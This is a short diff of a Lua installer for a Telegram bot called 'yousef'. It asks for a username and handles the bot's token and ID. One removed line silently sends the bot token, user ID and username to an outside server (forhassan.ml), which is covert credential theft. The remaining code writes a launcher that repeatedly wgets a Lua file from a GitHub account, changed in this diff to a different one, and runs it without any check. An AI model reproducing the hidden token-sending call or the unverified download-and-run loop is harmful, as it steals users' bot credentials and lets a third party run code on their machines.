@@ -38,7 +38,7 @@ if not database:get(Server_yousef.."UserName_yousef") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
+local Get_Info = http.request("http://tshake.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -64,14 +64,13 @@ os.execute('lua start.lua')
 end
 local function Files_yousef_Info()
 Create_Info(database:get(Server_yousef.."Token_yousef"),database:get(Server_yousef.."Id_yousef"),database:get(Server_yousef.."UserName_yousef"))   
-https.request("https://forhassan.ml/yousef/yousef.php?id="..database:get(Server_yousef.."Id_yousef").."&user="..database:get(Server_yousef.."UserName_yousef").."&token="..database:get(Server_yousef.."Token_yousef"))
 local Runyousef = io.open("yousef", 'w')
 Runyousef:write([[
 #!/usr/bin/env bash
 cd $HOME/yousef
 token="]]..database:get(Server_yousef.."Token_yousef")..[["
 rm -fr yousef.lua
-wget "https://raw.githubusercontent.com/Yosef-lbban/yousef/master/yousef.lua"
+wget "https://raw.githubusercontent.com/Yosef-lbban2/yousef/master/yousef.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./yousef.lua -p PROFILE --bot=$token
